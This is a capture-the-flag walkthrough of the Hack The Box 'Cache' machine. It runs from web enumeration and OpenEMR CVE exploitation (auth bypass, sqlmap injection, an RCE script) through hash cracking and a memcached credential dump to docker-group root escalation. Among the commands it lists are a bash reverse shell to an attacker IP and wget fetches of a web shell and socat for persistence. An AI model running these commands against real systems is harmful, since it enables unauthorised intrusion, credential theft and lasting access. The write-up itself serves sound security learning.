# User

## nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## web server

Forms on `login.html` and `contactus.html`. The login has some client side password checking with the following login `ash:H@v3_fun`. Entering the credentials takes you to `net.html`. The contactus form doesn't look like it does much. On the `author.html` file it says:

```
ASH is a Security Researcher (Threat Research Labs), Security Engineer. Hacker, Penetration Tester and Security blogger. He is Editor-in-Chief, Author & Creator of Cache. Check out his other projects like Cache:
HMS(Hospital Management System)
```

So let's test to see if there's another virtual host

```
╭─zoey@nomadic ~/htb/tools ‹master*›
╰─$ curl -v -H 'Host: hms.htb' http://10.10.10.188
*   Trying 10.10.10.188:80...
* TCP_NODELAY set
* Connected to 10.10.10.188 (10.10.10.188) port 80 (#0)
> GET / HTTP/1.1
> Host: hms.htb
> User-Agent: curl/7.68.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Tue, 12 May 2020 02:32:10 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Location: interface/login/login.php?site=default
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
```

## hms.htb

It's an OpenEMR php application. There are a few login forms. Accessing `hms.htb/sql_patch.php` shows the following version `OpenEMR 5.0.1 Database Patch 3`.
Finding vulnerabilities for this version we find an authentication bypass in `CVE-2018-15152`. This CVE allows us to bypass authentication for certains pages
in the portal. First we visit `/portal/account/register.php` and go through the prompts, then that sets some vars that allow us to access certain pages. One
of these pages is `portal/add_edit_event_user.php`. This is good because `CVE-2018-15145` tells us SQL injection is possible on this route through the `eid`,
`userid`, and `pid` parameters. Throwing the following into `sqlmap` we can dump the `users_secure` table:

`sqlmap --cookie=PHPSESSID=u8l4t7c0shmahe32h2koirf7ld -u http://hms.htb/portal/add_edit_event_user.php\?eid\=1 --technique=E -T users_secure --dump`

```
Database: openemr
Table: users_secure
[1 entry]
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
| id   | salt                           | username      | password                                                     | last_update         | salt_history1 | salt_history2 | password_history1 | password_history2 |
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
| 1    | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | 2019-11-21 06:38:40 | NULL          | NULL          | NULL              | NULL              |
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
```

When we toss the value of the `password` column into a file, we can use hashcat to crack it via

`hashcat -a 0 -m 3200 cache/openemr_admin.hash /usr/share/wordlists/rockyou.txt`

And the login is `openemr_admin:xxxxxx` which allows us to login as an administrator. Which brings us to `CVE-2019-8371`. We can download the script and
modfy it a bit to work with python 3.8. We then setup a netcat listener, and run the exploit with the following command:

`python openemr_exploit.py -u openemr_admin -p xxxxxx -c 'bash -i >& /dev/tcp/10.10.14.39/4444 0>&1' http://hms.htb`

Once we have our reverse shell lets setup persistence with a web shell, and socat. Download the webshell `wget http://10.10.14.39/tools/bash.php`. Then
grab socat and setup the reverse shell:

`wget http://10.10.14.39/tools/socat64s`

## ash - owning user

We can now use our login we found previously to `su` to the ash account and grab `user.txt`.

# Root

## enum

/etc/passwd

```
root:x:0:0:root:/root:/bin/bash
...
ash:x:1000:1000:ash:/home/ash:/bin/bash
luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
```

/etc/group

```
docker:x:999:luffy
```

### pspy

```
2020/05/13 02:47:01 CMD: UID=0    PID=26739  | telnet 127.0.0.1 11211
```

### services

```
memcache   951  0.0  0.1 425792  4064 ?        Ssl  May12   0:16 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
```

## memcached

Running `telnet 127.0.0.1 11211` we can connect to the memcache server. We can dump items by first getting the slab id with `stats items`:

```
STAT items:1:number 5
STAT items:1:number_hot 0
STAT items:1:number_warm 0
STAT items:1:number_cold 5
STAT items:1:age_hot 0
STAT items:1:age_warm 0
STAT items:1:age 59
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 0
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
STAT items:1:evicted_active 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 216
STAT items:1:lrutail_reflocked 0
STAT items:1:moves_to_cold 7515
STAT items:1:moves_to_warm 0
STAT items:1:moves_within_lru 0
STAT items:1:direct_reclaims 0
STAT items:1:hits_to_hot 0
STAT items:1:hits_to_warm 0
STAT items:1:hits_to_cold 0
STAT items:1:hits_to_temp 0
END
```

Since the slab id is 1 we can use cachedump to get the key names:

```
stats cachedump 1 100
ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
```

Then we retrieve the keys:

```
get link
VALUE link 0 21
https://hackthebox.eu
END
get user
VALUE user 0 5
luffy
END
get passwd
VALUE passwd 0 9
0n3_p1ec3
END
get file
VALUE file 0 7
nothing
END
get account
VALUE account 0 9
afhj556uo
END
```

## luffy - owning root

Login with `luffy:0n3_p1ec3`. Account is part of the docker group. We can use the gtfobins commands for docker. We can save and then load the alpine
package.

```sh
sudo docker save --output alpine-docker-image.tar alpine
# then transfer it to the remote machine and load it up
docker load -i alpine-docker-image.tar
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
